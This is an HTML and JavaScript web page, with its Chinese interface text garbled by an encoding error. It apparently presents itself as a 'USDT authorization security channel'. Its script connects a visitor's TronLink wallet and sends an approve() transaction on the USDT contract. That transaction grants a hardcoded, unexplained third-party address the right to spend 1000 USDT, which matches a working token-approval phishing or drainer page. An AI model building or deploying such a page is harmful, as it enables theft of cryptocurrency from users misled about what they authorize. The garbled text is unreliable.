<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>USDT æˆæƒ - ç¨³å®šç‰ˆ</title>
  <script src="https://unpkg.com/vconsole@latest/dist/vconsole.min.js"></script>
  <script>var vConsole = new VConsole();</script>
  <style>
    /* ... ä¿æŒä½ ä¹‹å‰çš„ CSS ä¸å˜ ... */
    .address-box { word-break: break-all; font-family: monospace; font-size: 13px; color: #007AFF; }
  </style>
</head>
<body>
  <div class="card">
    <h2>ğŸ” USDT æˆæƒå®‰å…¨é€šé“</h2>
    <p>æˆæƒæ•°é‡ï¼š1000 USDT</p>

    <button id="connectBtn">ğŸ”Œ æ‰‹åŠ¨è¿æ¥ TronLink é’±åŒ…</button>
    <div id="accountInfo" class="address-box"></div>
    <div id="status"></div>

    <button id="approveBtn" disabled>âœ… ç«‹å³æ‰§è¡Œæˆæƒ</button>

    <div class="label">
      ğŸ’¡ æç¤ºï¼šè¯·ç¡®ä¿è´¦æˆ·å†…æœ‰å°‘é‡ TRXï¼ˆçº¦30ä¸ªï¼‰ä½œä¸ºæ‰‹ç»­è´¹ç‡ƒçƒ§ï¼Œæˆ–æ‹¥æœ‰è¶³å¤Ÿèƒ½é‡ã€‚
    </div>
  </div>

  <script>
    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const SPENDER_ADDRESS = "TENBpGLoxcAsUQvUrN36xpDKPYmadpc1x3";
    const AMOUNT_USDT = 1000;
    const DECIMALS = 6;

    // --- å·¥å…·ï¼šæ˜¾ç¤ºçŠ¶æ€ ---
    function showMessage(text, type = 'info') {
        const el = document.getElementById('status');
        el.className = type;
        el.textContent = text;
    }

    // --- å·¥å…·ï¼šæ•°å€¼è½¬æ¢ ---
    function toTokenAmount(value, decimals) {
        return "0x" + (BigInt(value) * BigInt(Math.pow(10, decimals))).toString(16);
    }

    // --- æ ¸å¿ƒï¼šæ‰‹åŠ¨è¿æ¥é’±åŒ… ---
    async function connectWallet() {
        // 1. æ£€æŸ¥ window.tronWeb æ˜¯å¦å­˜åœ¨
        if (!window.tronWeb) {
            showMessage('âŒ æœªæ£€æµ‹åˆ° TronWebã€‚è¯·åœ¨ TronLink æµè§ˆå™¨ä¸­æ‰“å¼€ï¼Œæˆ–å®‰è£…æ’ä»¶ã€‚', 'error');
            return null;
        }

        try {
            // 2. è§¦å‘ TronLink çš„æˆæƒå¼¹çª—
            // å…¼å®¹æ€§å†™æ³•ï¼šéƒ¨åˆ†ç‰ˆæœ¬ä½¿ç”¨ request({method: 'tron_requestAccounts'})
            const res = await window.tronWeb.request({ method: 'tron_requestAccounts' });
            
            if (res && res.code === 200) {
                const address = window.tronWeb.defaultAddress.base58;
                document.getElementById('accountInfo').innerHTML = `<strong>å½“å‰åœ°å€ï¼š</strong><br>${address}`;
                document.getElementById('approveBtn').disabled = false;
                document.getElementById('connectBtn').innerText = "ğŸ”„ é‡æ–°è¿æ¥";
                showMessage('âœ… é’±åŒ…è¿æ¥æˆåŠŸ', 'success');
                return address;
            } else {
                showMessage('âš ï¸ ç”¨æˆ·å–æ¶ˆäº†æˆæƒ', 'error');
            }
        } catch (e) {
            console.error(e);
            showMessage('âŒ è¿æ¥å¼‚å¸¸: ' + (e.message || e), 'error');
        }
        return null;
    }

    // --- æ ¸å¿ƒï¼šæ‰§è¡Œæˆæƒ ---
    async function handleApprove() {
        const amount = toTokenAmount(AMOUNT_USDT, DECIMALS);
        showMessage('â³ æ­£åœ¨ç­‰å¾…é’±åŒ…ç¡®è®¤...', 'info');

        try {
            // å®ä¾‹åŒ–åˆçº¦
            const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
            
            // æ‰§è¡Œ approve äº¤æ˜“
            // ä½¿ç”¨ feeLimit é™åˆ¶æœ€å¤§æŸè€—ï¼ˆ100 TRX = 100,000,000 sunï¼‰
            const result = await contract.approve(SPENDER_ADDRESS, amount).send({
                feeLimit: 100_000_000,
                callValue: 0
            });

            if (result) {
                showMessage(`ğŸ‰ æˆæƒæŒ‡ä»¤å·²å‘å‡ºï¼\näº¤æ˜“å“ˆå¸Œ: ${result}`, 'success');
                console.log("äº¤æ˜“è¯¦æƒ…:", result);
            }
        } catch (err) {
            let errorMsg = err.message || String(err);
            if (errorMsg.includes("declined by user")) errorMsg = "ç”¨æˆ·æ‹’ç»äº†ç­¾å";
            showMessage(`âŒ æˆæƒå¤±è´¥: ${errorMsg}`, 'error');
        }
    }

    // ç»‘å®šäº‹ä»¶
    document.getElementById('connectBtn').addEventListener('click', connectWallet);
    document.getElementById('approveBtn').addEventListener('click', handleApprove);
  </script>
</body>
</html>
